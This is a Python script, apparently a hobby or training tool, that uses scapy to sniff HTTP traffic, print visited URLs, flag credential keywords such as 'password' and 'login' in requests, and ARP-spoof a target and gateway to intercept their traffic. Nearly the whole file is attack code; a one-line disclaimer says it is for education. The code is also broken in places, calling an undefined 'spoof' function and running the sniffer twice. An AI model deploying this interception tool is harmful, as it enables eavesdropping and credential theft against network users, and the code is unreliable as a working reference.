#!/usr/bin/env python3
import argparse, time, threading
import scapy.all as scapy
from scapy.layers import http

global spoofed_list, packet_sent, spoof_running

def main():
    ecouteReseau()

def ecouteReseau():
    scapy.sniff(iface=args.iface, filter=args.filter, count=args.count, prn=analysePaquet, store=args.save)

def analysePaquet(packet):
    if packet.haslayer(http.HTTPRequest) and packet[http.HTTPRequest].haslayer(http.HTTPRequest):
        extractUrl(packet)
        extractIds(packet)

def extractUrl(packet):
    url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
    print(f"URL extracted: {url}", url)

# You should change this list to something bigger
keywords_to_search = ('username', 'uname', 'user', 'login', 'password', 'pass', 'signin', 'signup', 'name')

def extractIds(packet):
    if packet[http.HTTPRequest].haslayer(scapy.Raw):
        body = packet[http.HTTPRequest].Raw.load.decode(errors="ignore")
        for keyword in keywords_to_search:
            if keyword in body:
                print(f"Keyword '{keyword}' found in the request body.")

    params = packet[http.HTTPRequest].http_request
    for keyword in keywords_to_search:
        if keyword in params:
            print(f"Keyword '{keyword}' found in the request parameters.")
    
def arpSpoofing(pdst, psrc):
    while spoof_running:
        packet = scapy.ARP(op=2, pdst=pdst, hwdst=getMac(pdst), psrc=psrc)
        scapy.send(packet, verbose=args.verbose)
        if args.verbose:
            print(f"[*] Packets sent {packet_sent}")
    cleanSpoof(pdst, psrc)

def getMac(ip):
    arp_who_has = scapy.ARP(pdst = ip)
    broadcast_l2 = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    request = broadcast_l2 / arp_who_has
    answered_list = scapy.srp(request, timeout=args.timeout, verbose=args.verbose)[0]
    return answered_list[0][1].hwsrc

def cleanSpoof(pdst, psrc):
    packet = scapy.ARP(op=2, pdst=pdst, psrc=psrc, hwdst=getMac(pdst), hwsrc=getMac(psrc))
    scapy.send(packet, verbose=args.verbose)
    if args.verbose:
        print(f"[*] Packets sent {packet_sent}")



if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog="Sniffer Python",
        description="Sniff the network",
        epilog="Do not use this program for malicious activity it's written only for educational purposes."
    )
    parser.add_argument("-f", "--filter")
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("-i", "--iface", required=True)
    parser.add_argument("-c", "--count")
    parser.add_argument("-s", "--save", action="store_true")

    parser.add_argument("--mitm")
    parser.add_argument("-t", "--target")
    parser.add_argument("--timeout", default=5)

    args = parser.parse_args()

    if args.mitm:
        spoof_running = True
        spoof_thread_target = threading.Thread(target=spoof, args=(args.target, args.mitm))
        spoof_thread_gtw = threading.Thread(target=spoof, args=(args.mitm, args.target))
        try:
            spoof_thread_target.start()
            spoof_thread_gtw.start()
            main()
        except Exception as e:
            print(f"{e}")
            print("Enter in the spoof target thread")
            spoof_thread_target.join()
            print("Enter in the spoof gateway thread")
            spoof_thread_gtw.join()
        finally:
            print("Exit correctly")

    main()